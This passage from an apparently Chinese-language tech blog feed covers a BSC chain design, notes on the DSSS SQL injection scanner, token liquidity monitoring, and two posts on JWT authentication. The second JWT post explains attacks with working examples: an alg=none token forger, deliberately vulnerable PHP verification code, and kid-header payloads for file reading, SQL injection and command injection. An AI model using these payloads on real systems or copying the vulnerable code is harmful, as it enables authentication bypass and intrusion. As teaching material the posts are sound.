<p>区块奖励不会立即发送给验证人，而是计算并积累在智能合约中；</p>
</li>
<li class="lvl-3">
<p>当BSC收到验证人集更新消息时，它将触发跨链转账，将奖励转账给验证人的托管地址。 托管地址是由系统控制，因此在向委派者承诺的分配完成之前，奖金是不能用的。</p>
</li>
<li class="lvl-3">
<p>为了使同步更简单，并分配时间以防出现罚没，第T天的奖励将在第T + 2 天分配。 在委托人收到奖励后，剩下的收益将被转移到验证人自己的奖励地址。</p>
</li>
</ol>
<h3 id="罚息">罚息</h3>
<p>罚息是链上管理的一部分，以确保恶意或负面行为受到惩罚。 BSC罚息证据可以由任何人提交。 交易提交要求提交罚息证据和缴纳手续费，但一旦成功提交，也带来了更多奖励。</p>
<p>到目前为止，有两种可以被惩罚的情况。</p>
<p><strong>双重签名</strong></p>
<p>当验证人故意签署多个相同高度并具有相同父块的区块时，这是很严重的作恶行为。 协议的实现应该已经考虑到如何防止这种情况发生，因此只有恶意代码才能触发这种情况。当出现双重签名时，验证人应该立即从验证人集合中移除。</p>
<p>任何人都可以在 BC 上提交带有 BSC 双重签名的罚息请求，应该包含两个具有相同高度的区块头和母区块，以及违规验证人的签名。 在收到证据后，如果 BC 确认该证据是有效的：</p>
<ol>
<li class="lvl-3">
<p>该验证人将立刻发送 BSC “验证人集合更新”跨链消息，恶意验证人将从验证集中剔除；</p>
</li>
<li class="lvl-3">
<p>验证人的权益质押将按照预先设定的金额进行惩罚；</p>
</li>
<li class="lvl-3">
<p>一部分被惩罚的BNB 将奖励给证据提交者。奖励金额应远远大于提交罚息请求事件的成本</p>
</li>
<li class="lvl-3">
<p>剩下的 BNB 将分配给其他验证人的托管地址，并以与区块奖励相同的方式分配给所有委托人。</p>
</li>
</ol>
<p><strong>不稳定性</strong></p>
<p>BSC 的可用性依赖于PoSA共识中验证人集合中的每个验证人，当轮到其出块时，他们能够及时生成区块。 验证人可能由于一些原因而错过出块时机，特别是由于硬件、软件、配置或网络方面的问题。 这种不稳定运行将损害网络的性能，并给系统带来更多的不确定性。</p>
<p>BSC有一个内部的合约，负责记录每个验证人错过的区块。 一旦该指标超过预定义的阈值，验证人的区块奖励将不会被转移到 BC 进行分发，而是被其他更好的验证人共享。通过这种方式，运行不良的验证人会逐渐退出，因为它们的委托人将获得较少奖励或没有奖励。如果该数据仍然高于另一个较高的阈值级别，验证人将受到惩罚，并将传输回BC，在BC中，验证人的的抵押资产将被罚没一部分。</p>
<p><strong>参数管理</strong></p>
<p>有许多系统参数来控制 BSC 的行为，如罚息阈值和数量，跨链转账费用等。所有这些参数将由 BSC 验证人通过提案投票过程确定。此过程将在 BC 上进行，系统合约将通过跨链通信来获取最新参数。</p>
<h2 id="中继器">中继器</h2>
<p>中继器负责提交两个区块链之间的跨链通信包。 由于并联链结构的异构性，产生了两种不同类型的中继器。</p>
<h3 id="BSC中继器">BSC中继器</h3>
<p>BC 到 BSC 通信的中继器称为&quot;BSC 中继器&quot;，或简称为&quot;中继器&quot;。<br />
中继器是一个独立的进程，任何人都可以在任何地方运行，但是中继器必须在BSC 注册并锁定一定数量的 BNB 。 BSC将只接受来自已注册的中继器的中继请求。</p>
<p>它们所传递的数据包将由 BSC 上的链上轻客户端进行验证。中继成功需要通过足够的验证，并在BSC上支付足够的手续费，因此，应该有激励性奖励来鼓励社区经营中继器。</p>
<h4 id="激励">激励</h4>
<p>有两种主要的沟通方式：</p>
<ol>
<li class="lvl-3">
<p>客户端操作，如跨链绑定、转账和错误处理等。 这应该由事件请求者支付。</p>
</li>
<li class="lvl-3">
<p>系统同步，例如传递“退回资金”数据包（由于大多数Oracle中继失败造成的），或者用于验证的区块头，以及验证人集合更新。以上奖励由 BSC 系统合约支付。</p>
</li>
</ol>
<p>如果某些中继器有更快的网络和更好的硬件，它们可以垄断所有的中继包，而不会给其他中继器留下任何收益。 因此，将有更少的参与者加入中继，这将鼓励集中化，但损害网络的效率和安全。 理想情况下，由于 BSC 验证人的分散化和动态重新选择，一个中继器不可能总是第一个传递每个消息。 但是为了避免进一步的垄断，奖励经济机制也是专门为尽量减少这种机会而设计的：</p>
<ol>
<li class="lvl-3">
<p>对中继器的奖励将只分批次发放，而一次发放将覆盖多个成功的中继器包。</p>
</li>
<li class="lvl-3">
<p>一个中继器可以从批处理分发中获得的报酬与成功中继包的数量并不是成比例的。 相反，除了前几个数据包，在一个批次期间中继器传递传递数据包越多，它将获得的报酬越少。</p>
</li>
</ol>
<h3 id="Oracle中继器">Oracle中继器</h3>
<p>BSC 到 BC 通信的中继器使用 “Oracle”模型，也就是所谓的 “Oracle 中继器”。 每个BC验证人都必须（只有验证集合中的验证人可以）运行 Oracle 中继器。 每个 Oracle 中继器都会观察 BSC状态的变化。 一旦它捕获到跨链通信包，它将提交投票请求。在获得大于2/3投票支持更改之后，将执行跨链操作。</p>
<p>Oracle 中继器应该等待足够的区块来确认 BSC 的最终结果，然后才向 BC 提交和投票跨链通信包。</p>
<p>跨链费用将与正常的 BC 区块奖励一起分配给 BC 验证人。</p>
<p>此种 Oracle中继器依赖于所有验证人的支持。 由于跨链通信包的所有投票都记录在区块链上，因此评估 Oracle 中继器的性能并不难。将来可能会通过引入的另一种惩罚机制来限制表现最差的验证人的收益。</p>
<h2 id="展望">展望</h2>
<p>对于币安链的未来，很难做出一个定论，因为它从未停止进化。双链策略一方面为用户打开了灵活可扩展的编程之门，另一方面为用户保留了极速交易合转账的便利，但这只是币安链发展的一个阶段。以下是一些值得关注的主题，以促进社区更好地获得更多的可用性和可扩展性：</p>
<p>1.为不同的业务用例添加不同的数字资产模型<br />
2.实现将更多的数据源，特别是 DEX 市场数据，从币安 DEX传输到BSC<br />
3.提供兼容以太坊及其未来升级，以及其他区块链的接口<br />
4.改进钱包和区块链客户端的可用性</p>
]]></content>
      <categories>
        <category>Document</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Document</tag>
      </tags>
  </entry>
  <entry>
    <title>Dsss源码-100行的SqliScanner-源码分析笔记</title>
    <url>/2019/56271.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>最近想要写个Auto Sqli Scanner,故找了sqlmap作者写的工具DSSS来参考.</p>
<blockquote>
<p>Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters) written in under 100 lines of code.</p>
</blockquote>
<p>之前也看过一部分<code>sqlmap</code>的源码，看起来头真的有点大。</p>
<p>相比强大的<code>sqlmap</code>来说,这个工具短小精悍,便于食用,毕竟代码量少很多hhh.</p>
<p>原仓库地址:<a href="https://github.com/stamparm/DSSS">Damn Small SQLi Scanner</a><br />
我的源代码注释版本:<code>https://github.com/jerrychan807/DSSS</code></p>
<hr />
<h1>整体流程:</h1>
<p><img src="https://i.loli.net/2019/05/06/5cd054aa1e705.png" alt="" /></p>
<hr />
<h2 id="提取内容函数：">提取内容函数：</h2>
<p><img src="https://i.loli.net/2019/05/06/5cd0550f672ff.png" alt="" /></p>
<p>亮点:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>TEXT文本的处理</p>
</li>
</ul>
<hr />
<h2 id="基于报错的测试">基于报错的测试:</h2>
<p><img src="https://i.loli.net/2019/05/06/5cd0557531ada.png" alt="" /></p>
<hr />
<h2 id="基于布尔的测试">基于布尔的测试:</h2>
<p><img src="https://i.loli.net/2019/05/06/5cd05595e835e.png" alt="" /></p>
<p>在页面文本相似度那里,对于0.95那个理解有点费劲,提了个<a href="https://github.com/stamparm/DSSS/issues/8">issue</a>问作者.</p>
<p>作者很nice,也很快就回复我了。我才get到它这里面的判断有2种:精确判断和模糊判断.</p>
<p>精确判断：可以通过<code>HTTP-CODE</code>和<code>TITLE</code>来判断两个页面是否是100%一样</p>
<p>模糊判断: 通过<code>quick_ratio</code>来计算两个页面的文本相似度,因为<code>quick_ratio</code>计算有时不太准确,有一定的误差,故<code>FUZZY_THRESHOLD = 0.95</code>设置如此,留了5%做误差.</p>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>FAQ-如何监控token初次添加流动性</title>
    <url>/2022/14901.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>很多币在一开始空投的时候，还没添加流动性，由于没有流动性，无法在<code>dex</code>上进行买卖。那如何监控某个币初次添加了流动性呢？</p>
<p>暂时能想到的2个思路:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>监控bscscan上的数据</p>
</li>
<li class="lvl-2">
<p>查询LP地址在配对主流币种的余额</p>
</li>
</ul>
<h1>监控bscscan:</h1>
<p>这部分我没有去具体实现，暂时能想到的有几个实现的方向已知项目方的地址后，去监控对应地址有没<code>Add Liquidity</code>的动作</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513150515.png" alt="20220513150515" /></p>
<p>或者监控<code>PancakeSwap: Router v2</code>合约的交互记录里的<code>Add Liquidity</code>的动作</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513150709.png" alt="20220513150709" /></p>
<h1>LP地址在配对主流币种合约里的余额</h1>
<p>如果是在bsc上的话，一般添加流动性的时候，Token会与<code>BNB</code>、<code>USDT</code>、<code>BUSD</code>、<code>CAKE</code>、<code>USDC</code>等主流的币种进行组合。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513151119.png" alt="20220513151119" /></p>
<p>例如该<code>token</code>是和<code>USDT</code>组合的，那用<code>LP Token</code>地址在<code>USDT</code>的合约能查询到对应的余额。</p>
<p>例如某token只和<code>USDT</code>组合添加了流动性，那在看k线网站上<code>liquidity</code>数值和<code>LP Token</code>地址在<code>USDT</code>的合约里的余额是一样的。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513152149.png" alt="20220513152149" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220513152421.png" alt="20220513152421" /></p>
<p>那么我们就能通过<code>LP Token</code>地址在主流币种合约里的余额来判断、监控 首次添加的流动性的动作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 部分代码</span></span><br><span class="line">USDT_contract = bsc_ins.get_token_contract_with_abi(contract_address=USDT_token, abi=erc20abi) <span class="comment"># usdt合约实例</span></span><br><span class="line">YourToken_usdt_lp = Web3.toChecksumAddress(<span class="string">&quot;0x5eaa1c251db4b0aea24619a37c5c311111111111&quot;</span>) <span class="comment"># token&amp;USDT 组成的lp地址</span></span><br><span class="line">balanceOf = USDT_contract.functions.balanceOf(Web3.toChecksumAddress(YourToken_usdt_lp)).call() <span class="comment"># 查询Lp地址的USDT的余额</span></span><br><span class="line"><span class="keyword">if</span> balanceOf &gt; <span class="number">0</span>:</span><br><span class="line">    notify_content = <span class="string">&quot;&quot;&quot;🟢Usdt lp池子监控存在 \n&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Question:</p>
<ol>
<li class="lvl-3">如果某token的流动性池子里存在多个配对的主流币种，看k线网站上<code>liquidity</code>数值是怎么统计出来的呢？</li>
<li class="lvl-3">如何快速查询某token的lp地址?多个地址？</li>
</ol>
</blockquote>
<h1>Summary:</h1>
<p>监控token初次添加流动性的方法:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>监控bscscan上的数据</p>
<ul class="lvl-2">
<li class="lvl-4">项目方的地址的<code>Add Liquidity</code>动作</li>
<li class="lvl-4"><code>PancakeSwap: Router v2</code>合约里的<code>Add Liquidity</code>的动作</li>
</ul>
</li>
<li class="lvl-2">
<p>查询LP地址在配对主流币种(<code>BNB</code>、<code>USDT</code>、<code>BUSD</code>等)合约里的余额</p>
</li>
</ul>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/beeb/pancaketrade">PancakeTrade</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>FAQ</category>
      </categories>
      <tags>
        <tag>FAQ</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON Web Token(JWT)攻击探究(一)</title>
    <url>/2020/59254.html</url>
    <content><![CDATA[<h1>来源</h1>
<p>用户认证的方式通常有两种，传统的session认证 和 基于token方式。</p>
<hr />
<h2 id="传统的session认证">传统的session认证</h2>
<h3 id="sessionID的生成方式">sessionID的生成方式:</h3>
<p>浏览器第一次访问服务器时，服务器创建一个<code>session</code>，同时生成一个唯一的会话key，即<code>sessionID</code>。</p>
<p>接着sessionID及session分别作为key和value保存到缓存中，也可以保存到数据库中，然后服务器把sessionID以cookie的形式发送给浏览器，浏览器下次访问服务器时直接携带上cookie中的sessionID，服务器再根据sessionID找到对应的session进行匹配</p>
<p>这里我们注意到两点：</p>
<ol>
<li class="lvl-3">
<p><code>sessionID</code>会自动由浏览器带上</p>
</li>
<li class="lvl-3">
<p><code>session</code>是需要存储空间的</p>
</li>
</ol>
<h3 id="缺陷">缺陷</h3>
<p>传统的session认证,随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来.</p>
<p>例如而随着认证用户的增多，服务端的开销会明显增大，这样在分布式的应用上，相应的限制了负载均衡器的能力，因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p>
<hr />
<h2 id="基于token的鉴权机制">基于token的鉴权机制</h2>
<p>基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着<strong>基于token认证机制的应用不需要去考虑用户在哪一台服务器登录</strong>了，这就为应用的扩展提供了便利。</p>
<h3 id="token的生成方式">token的生成方式</h3>
<p>浏览器第一次访问服务器时，服务器根据传过来的唯一标识<code>userId</code>，通过一些算法，加一个密钥，生成一个token，接着通过base64编码将token返回给客户端。客户端将token保存起来，下次请求时需要带着token，服务器收到请求后，用相同的算法和密钥去验证token</p>
<p>这里我们注意到两点：</p>
<ol>
<li class="lvl-3">
<p>token需要代码才能带上</p>
</li>
<li class="lvl-3">
<p>token可以不需要存储空间（JWT）（当然也有存入缓存的处理，特别是要进行revoke操作时），通过算法和密钥验证</p>
</li>
</ol>
<h2 id="token与sessionID的区别">token与sessionID的区别:</h2>
<ol>
<li class="lvl-3">
<p>浏览器方面，是否直接带上</p>
</li>
<li class="lvl-3">
<p>服务器方面，是否需要存储空间。</p>
</li>
</ol>
<blockquote>
<p>其实token与session的问题是一种时间与空间的博弈问题，session是空间换时间，而token是时间换空间。两者的选择要看具体情况而定。</p>
</blockquote>
<hr />
<h1>JWT(JSON Web Token)</h1>
<h2 id="定义">定义:</h2>
<p>JWT(JSON Web Token) 是一个非常轻巧的规范，通过这个规范，可以传递可靠的安全信息，JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。</p>
<p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).</p>
<p>该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。</p>
<p>JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<hr />
<h2 id="组成">组成:</h2>
<p>一个通常你看到的jwt，由以下三部分组成，它们分别是：</p>
<ol>
<li class="lvl-3">
<p><code>header</code>：主要声明了JWT的签名算法；</p>
</li>
<li class="lvl-3">
<p><code>payload</code>：主要承载了各种声明并传递明文数据；</p>
</li>
<li class="lvl-3">
<p><code>signture</code>：拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT 也就是不安全的JWT，此时header中声明的签名算法为none。</p>
</li>
</ol>
<p><code>signture</code>:将上面的<code>header</code>和<code>payload</code>编码后的字符串都用句号.连接在一起 提供一个密钥（secret）用头部所规定的算法加密就可以形成一个新的字符串</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417110456.png" alt="20200417110456" /></p>
<p>三个部分用·分割。形如<code>xxxxx.yyyyy.zzzzz</code>的样式。</p>
<p>示例:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417105901.png" alt="20200417105901" /></p>
<h2 id="签名的目的">签名的目的:</h2>
<p>最后一步签名的过程，实际上是对头部以及载荷内容进行签名。</p>
<p>所以，如果有人对头部以及载荷的内容解码之后进行修改，再进行编码的话，那么新的头部和载荷的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417110731.png" alt="20200417110731" /></p>
<p>服务器应用在接受到JWT后，会首先对头部和载荷的内容用同一算法再次签名。那么服务器应用是怎么知道我们用的是哪一种算法呢？别忘了，我们在JWT的头部中已经用alg字段指明了我们的加密算法了。</p>
<p>如果服务器应用对头部和载荷再次以同样方法签名之后发现，自己计算出来的签名和接受到的签名不一样，那么就说明这个Token的内容被别人动过的，我们应该拒绝这个Token，返回一个HTTP 401 Unauthorized响应。</p>
<hr />
<h1>工具:</h1>
<p><a href="https://jwt.io/">解jwt的</a></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://segmentfault.com/a/1190000015881055">token与sessionId的区别——学习笔记</a></p>
</li>
<li class="lvl-2">
<p><a href="http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/">八幅漫画理解使用JSON Web Token设计单点登录系统</a></p>
</li>
<li class="lvl-2">
<p><a href="http://blog.leapoahead.com/2015/09/06/understanding-jwt/">JSON Web Token - 在Web应用间安全地传递信息</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON Web Token(JWT)攻击探究(二)</title>
    <url>/2020/10194.html</url>
    <content><![CDATA[<h1>JWT 攻击面:</h1>
<h2 id="敏感信息泄露">敏感信息泄露:</h2>
<p>当服务端的秘钥泄密的时候，JWT的伪造就变得非常简单容易。对此，服务端应该妥善保管好私钥，以免被他人窃取。</p>
<p>header和payload部分实际上只是进行了base64编码</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417143359.png" alt="20200417143359" /></p>
<hr />
<h2 id="alg-None签名绕过">alg=None签名绕过:</h2>
<p>签名算法确保恶意用户在传输过程中不会修改JWT。</p>
<p>但是标题中的alg字段可以更改为none。</p>
<p>一些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.‘+ payload +’.’）并将其提交给服务器</p>
<p>例子:</p>
<p><code>http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64urlencode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = b64urlencode(<span class="string">&quot;&#123;\&quot;typ\&quot;:\&quot;JWT\&quot;,\&quot;alg\&quot;:\&quot;none\&quot;&#125;&quot;</span>) + \</span><br><span class="line">         <span class="string">&#x27;.&#x27;</span> + b64urlencode(<span class="string">&quot;&#123;\&quot;data\&quot;:\&quot;test\&quot;&#125;&quot;</span>) + <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出</span></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjoidGVzdCJ9.</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417143748.png" alt="20200417143748" /></p>
<p>server源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://github.com/Sjord/jwtdemo/blob/master/MishalHS256.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Jwt</span>\<span class="title">Jwt</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Jwt</span>\<span class="title">Algorithm</span>\<span class="title">NoneAlgorithm</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Jwt</span>\<span class="title">Algorithm</span>\<span class="title">HS256Algorithm</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MishalHS256</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;algorithms = [</span><br><span class="line">            <span class="string">&#x27;none&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">NoneAlgorithm</span>(),</span><br><span class="line">            <span class="string">&#x27;HS256&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">HS256Algorithm</span>(<span class="string">&#x27;secret&#x27;</span>),</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encodeJwt</span>(<span class="params"><span class="variable">$tokenObj</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Jwt</span>::<span class="title function_ invoke__">encode</span>(<span class="variable">$tokenObj</span>, <span class="variable">$this</span>-&gt;algorithms[<span class="string">&#x27;HS256&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decodeJwt</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JWT::<span class="title function_ invoke__">decode</span>(<span class="variable">$token</span>, [<span class="string">&#x27;algorithm&#x27;</span> =&gt; <span class="title function_ invoke__">array_values</span>(<span class="variable">$this</span>-&gt;algorithms)]); <span class="comment"># header部分中指定加密方法为none方法,服务端也用none方法来解密。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>加密方法是读取JWT的header部分吗?</p>
</blockquote>
<hr />
<h2 id="将签名算法从非对称类型改为对称类型">将签名算法从非对称类型改为对称类型:</h2>
<p>使用非对称加密算法（主要基于RSA、ECDSA，如S256）分发JWT的过程是使用私钥（private）加密生成JWT，使用公钥（public）解密验证。</p>
<p>使用对称加密算法（主要基于HMAC，如HS256）分发JWT的过程是使用同一个密钥（secret）生成和验证JWT。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FirebaseRS256</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;private_key = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;private.pem&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;public_key = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;public.pem&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encodeJwt</span>(<span class="params"><span class="variable">$tokenObj</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JWT::<span class="title function_ invoke__">encode</span>(<span class="variable">$tokenObj</span>, <span class="variable">$this</span>-&gt;private_key, <span class="string">&#x27;RS256&#x27;</span>); <span class="comment">// 私钥加密作为签名</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decodeJwt</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Explicitly configured to be vulnerable:</span></span><br><span class="line">        <span class="comment">// we expect a RS256 signature, but also accept a HS256 signature.</span></span><br><span class="line">        <span class="keyword">return</span> JWT::<span class="title function_ invoke__">decode</span>(<span class="variable">$token</span>, <span class="variable">$this</span>-&gt;public_key, [<span class="string">&#x27;RS256&#x27;</span>, <span class="string">&#x27;HS256&#x27;</span>]); <span class="comment">// HS256对称加密方式 用公钥作为秘钥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一开始的流程是,服务端用私钥加密作为签名，然后用公钥进行验证。</p>
<p>由于我们很难知道私钥，所以我们想自己构造数据的话,没法用相同的私钥签名回去。</p>
<p>但解密时支持<code>HS256</code>这种对称加密方式的话,它只有一个秘钥，如图是公钥。</p>
<p>也就是说我们只要找到公钥,就能篡改数据后,再把数据签名回去，这样能通过延签的部分。</p>
<hr />
<h2 id="HS256（对称加密）密钥破解">HS256（对称加密）密钥破解:</h2>
<p>如果HS256密钥强度较弱，则可以直接强制使用，通过爆破 HS256的秘钥可以完成该操作。</p>
<p>不过对 JWT 的密钥爆破需要在一定的前提下进行：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>知悉JWT使用的加密算法</p>
</li>
<li class="lvl-2">
<p>一段有效的、已签名的token</p>
</li>
<li class="lvl-2">
<p>签名用的密钥不复杂（弱密钥）</p>
</li>
</ul>
<p>所以其实JWT密钥爆破的局限性很大。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200418113805.png" alt="20200418113805" /></p>
<p>可以看到简单的字母数字组合都是可以爆破的，但是密钥位数稍微长一点或者更复杂一点的话，爆破时间就会需要很久。</p>
<hr />
<h2 id="修改KID参数">修改KID参数:</h2>
<p><code>kid</code>是<code>jwt header</code>中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/home/jwt/.ssh/pem&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为该参数可以由用户输入，所以也可能造成一些安全问题。</p>
<h3 id="任意文件读取">任意文件读取:</h3>
<p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/etc/passwd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SQL注入">SQL注入:</h3>
<p><code>kid</code>也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过<code>signature</code>的验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;key11111111&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="命令注入">命令注入</h3>
<p>对<code>kid</code>参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了<code>open</code>函数，通过构造参数就可能造成命令注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/path/to/key_file|whoami&quot;</span><br></pre></td></tr></table></figure>
<p>对于其他的语言，例如php，如果代码中使用的是<code>exec</code>或者是<code>system</code>来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。</p>
<hr />
<h2 id="总结-2">总结:</h2>
<p>与许多其他方面一样，JWT基本上是安全的，但某些实现则不是。</p>
<p>该应用程序可能在JWT中存储敏感信息，允许更改签名算法，或者签名中使用的密钥强度不足、kid参数可控。</p>
<hr />
<h2 id="其他">其他:</h2>
<p>RSA的公钥和私钥区别</p>
<p>公钥和私钥是成对的，它们互相解密。</p>
<p>公钥加密，私钥解密。</p>
<p>私钥数字签名，公钥验证。</p>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>A 要给 B 发信息要用 B 的公钥加密，B 用自己的私钥解密。</p>
</li>
<li class="lvl-2">
<p>A 发布了一篇文章，说这是我发的，我用自己的私钥签名了。由于之前 A 已经发布了他的公钥，所以其它人可以用这个公钥去验证。因为知道 A 私钥的只可能是 A 自己。</p>
</li>
</ul>
</blockquote>
<p>这样的话：加密是保护数据，签名是核对身份，解决的是不同需求。那么我的理解：不应该是需要解决什么问题就用什么吗？不希望第三方收到内容就加密，不希望第三方冒充发布就签名，或者同时使用。</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.freebuf.com/articles/web/181261.html">深入了解Json Web Token之实战篇</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Sjord/jwtdemo">jwtdemo</a></p>
</li>
